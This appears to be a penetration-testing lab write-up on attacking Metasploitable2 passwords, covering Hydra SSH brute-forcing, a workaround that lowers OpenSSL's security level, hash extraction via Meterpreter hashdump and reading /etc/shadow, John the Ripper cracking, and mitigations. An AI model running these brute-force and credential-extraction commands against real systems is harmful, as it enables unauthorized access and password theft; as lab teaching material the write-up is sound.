# Password Attacks — Hydra + John the Ripper

Part of Task 4. Two different angles on the same underlying weakness — bad or guessable passwords: Hydra attacks a live login service directly over the network, while John the Ripper cracks password hashes that have already been extracted (e.g. via Meterpreter's `hashdump` or by reading `/etc/shadow` directly after getting root). Tested against Metasploitable2's SSH service and its local password hashes.

---

## 1. Brute-forcing SSH with Hydra

### What Hydra actually does
Hydra is an online/network brute-forcer — it connects to a live service (SSH here, but it supports FTP, HTTP forms, RDP, databases, and dozens of other protocols) and tries username/password combinations one at a time against the real authentication prompt, watching for a success/failure response.

This is slower and noisier than offline hash cracking (every attempt is a real network round-trip, and a real server can rate-limit, lock out, or log every failed attempt), but it's necessary whenever only the live service is reachable and no password hash has been obtained yet.

### Single known username, full wordlist
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.112.133
```
- `-l msfadmin` → lowercase `-l` targets a single, specific username (Metasploitable2's known default account).
- `-P <wordlist>` → uppercase `-P` points to a password **list** to try against that username.
- `ssh://192.168.112.133` → protocol and target.

For a live demo, the full `rockyou.txt` (14+ million lines) is impractical against SSH specifically, since each attempt requires a full SSH handshake — far slower than something like a raw HTTP form. Trimming to a smaller list that includes the real password keeps the demo to a reasonable length:
```bash
grep -E "^(msfadmin|password|123456|admin|root|toor)$" /usr/share/wordlists/rockyou.txt > trimmed_pass.txt
echo "msfadmin" >> trimmed_pass.txt   # ensure the real password is definitely in the list
hydra -l msfadmin -P trimmed_pass.txt ssh://192.168.112.133
```

### Brute-forcing both username and password lists
```bash
hydra -L userlist.txt -P passlist.txt ssh://192.168.112.133 -t 4
```
- `-L userlist.txt` → uppercase `-L` tries a **list** of usernames instead of one fixed one.
- `-t 4` → limits Hydra to 4 parallel connection attempts at once. SSH servers commonly throttle or reject too many simultaneous auth attempts (`MaxStartups` in `sshd_config`), so a high thread count can cause more failures/timeouts than it saves in time. Hydra itself warns about this by default.

### Example output (successful run)
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-10 20:10:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 17 login tries (l:1/p:17), ~5 tries per task
[DATA] attacking ssh://192.168.112.133:22/
[22][ssh] host: 192.168.112.133   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-10 20:10:19
```
The key line is `[22][ssh] host: ... login: msfadmin password: msfadmin` — Hydra found a working credential pair and stopped (by default it stops per-login once a valid password is found, unless `-f` global-stop or continued enumeration is explicitly configured otherwise).

### A real obstacle worth documenting: legacy SSH algorithm mismatch
Metasploitable2 runs OpenSSH 4.7p1 (2007), which only offers legacy host-key/KEX algorithms (`ssh-rsa`, `ssh-dss`, older Diffie-Hellman groups). Modern Kali has these disabled by default at the OpenSSL security-policy level, so Hydra fails before it even gets to try credentials:
```
[ERROR] could not connect to ssh://192.168.112.133:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,...]
```
**Fix** — lower OpenSSL's security level so the older algorithms are permitted again (lab-only change, worth reverting afterward):
```bash
sudo nano /usr/lib/ssl/openssl.cnf
```
Change:
```
CipherString = DEFAULT@SECLEVEL=2
```
to:
```
CipherString = DEFAULT@SECLEVEL=1
```
Confirm the right file was edited (`openssl version -d` shows the active `OPENSSLDIR`), open a **fresh terminal** (config can be cached in an already-running shell), and verify with a plain SSH connection before retrying Hydra:
```bash
ssh msfadmin@192.168.112.133
```
If that reaches a password prompt, Hydra will too. This is worth including in notes/report as its own small finding — it's a good demonstration that "modern security defaults can get in the way of testing legacy systems," which is a realistic problem in any environment still running old infrastructure.

---

## 2. Cracking hashes with John the Ripper

### What John actually does
Where Hydra attacks a live service, John the Ripper works entirely offline against password **hashes** already in hand — no network traffic, no rate limiting, no risk of lockout, and far faster per-attempt since it's just computing hashes locally and comparing, not waiting on a network round trip.

### Getting the hashes
Two routes, both covered earlier in this task:
```bash
# Route 1 — via Meterpreter post-exploitation module (Linux target)
use post/linux/gather/hashdump
set SESSION <id>
run

# Route 2 — manually, once root access is already available
cat /etc/shadow
```
Either way, save the relevant line(s) to a file, e.g. `hashes.txt`. A `/etc/shadow` line looks like:
```
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
```
The `$1$` prefix indicates the hash type — in this case MD5-crypt (`$1$`); other common prefixes are `$5$` (SHA-256) and `$6$` (SHA-512).

### Cracking with a wordlist
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
John auto-detects the hash format from the `$1$`/`$5$`/`$6$` prefix in most cases, so this is usually enough on its own.

### Viewing cracked results
```bash
john --show hashes.txt
```
Example output:
```
msfadmin:msfadmin:14684:0:99999:7:::

1 password hash cracked, 0 left
```

### Forcing a specific format (when auto-detection isn't enough)
Useful for hash types pulled from other sources (e.g. DVWA's MD5 hashes from the SQLi task, which have no `$id$` prefix at all):
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
Common `--format` values worth knowing: `raw-md5`, `raw-sha1`, `raw-sha256`, `sha512crypt`, `md5crypt`, `nt` (Windows NTLM).

### Example full session
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
msfadmin         (msfadmin)
1g 0:00:00:02 DONE (2026-10-10 20:22) 0.4347g/s 1234p/s 1234c/s 1234C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed

$ john --show hashes.txt
msfadmin:msfadmin:14684:0:99999:7:::

1 password hash cracked, 1 left
```

---

## 3. Why both tools matter for the same problem

| | Hydra | John the Ripper |
|---|---|---|
| Attacks | A live service, over the network | A password hash, already extracted |
| Speed | Limited by network/service response time | Limited only by local CPU/GPU |
| Detectability | Generates logs/alerts on the target (failed login attempts) | Invisible to the target — happens entirely offline |
| Needs | Just network access to the service | Needs the hash to already be obtained (via exploitation, hashdump, file read access) |

In a real engagement, the two are often chained: compromise one low-value service to get root (Phase 3 in this task, via the vsftpd backdoor), extract password hashes from that box (`hashdump` / `/etc/shadow`), crack them offline with John, then use the recovered credentials to pivot into other systems where the same password might be reused — which is exactly why password reuse across accounts (also seen in the SQLi task, where `admin` and `smithy` shared a hash) is such a common and serious finding on its own.

---

## 4. Mitigation

**Against Hydra-style online brute-forcing:**
- Account lockout after a defined number of failed attempts.
- Rate limiting / connection throttling at the service level (`MaxStartups`, `fail2ban` for SSH specifically).
- Disable password authentication entirely in favor of SSH key-based auth:
  ```
  # /etc/ssh/sshd_config
  PasswordAuthentication no
  ```
- Move SSH off the default port and/or restrict access via firewall rules to known IP ranges — not a real fix on its own (security through obscurity), but reduces automated scan noise.

**Against John-style offline cracking:**
- Enforce strong password policies (length, complexity, no dictionary words) so cracking a hash, even with unlimited time, isn't fast or guaranteed.
- Use modern, slow, salted hashing algorithms (bcrypt, scrypt, Argon2) rather than fast algorithms like plain MD5 or SHA-1 — a "slow" hash function is deliberately expensive to compute, which directly slows down every cracking attempt.
- Never let password hashes become reachable in the first place — the real root cause in this task's case was that root access (via the vsftpd backdoor) made `/etc/shadow` readable at all. Fixing the initial foothold prevents this step from being possible.

---

## Key Takeaways

- Hydra and John solve the same underlying problem (weak/guessable passwords) from two different angles — one live/online, one offline/post-extraction — and are often used together in sequence during a real engagement.
- Legacy targets like Metasploitable2 can trigger unrelated compatibility errors (SSH algorithm mismatches) on a modern attacking machine — recognizing that this is an attacking-tool config issue, not a dead end, is part of the exercise.
- `-t 4` and similar thread-limiting flags exist because brute-forcing too aggressively can cause more failures (timeouts, service throttling) than it prevents — "faster" isn't always actually faster against a rate-limited service.
- The real fix for both attack types isn't a single control — it's layered: strong unique passwords, modern slow hashing, account lockout/rate limiting, and (ideally) moving away from password auth entirely in favor of keys/MFA.
